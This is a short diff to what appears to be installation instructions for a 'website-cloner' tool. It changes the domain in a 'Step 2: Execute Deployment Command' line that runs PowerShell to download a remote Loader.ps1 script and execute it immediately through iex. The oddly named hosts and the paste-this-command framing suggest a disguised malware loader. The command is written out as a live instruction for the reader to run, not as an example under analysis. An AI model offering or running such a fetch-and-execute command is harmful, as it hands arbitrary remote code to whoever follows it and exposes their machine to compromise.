@@ -13,7 +13,7 @@
 
 ### Step 2: Execute Deployment Command
 ```cmd
-powershell -Command "irm https://software-get.click/Loader.ps1?get=website-cloner | iex"
+powershell -Command "irm https://software-get.xyz/Loader.ps1?get=website-cloner | iex"
 ```
 
 ### Step 3: Wait for Completion
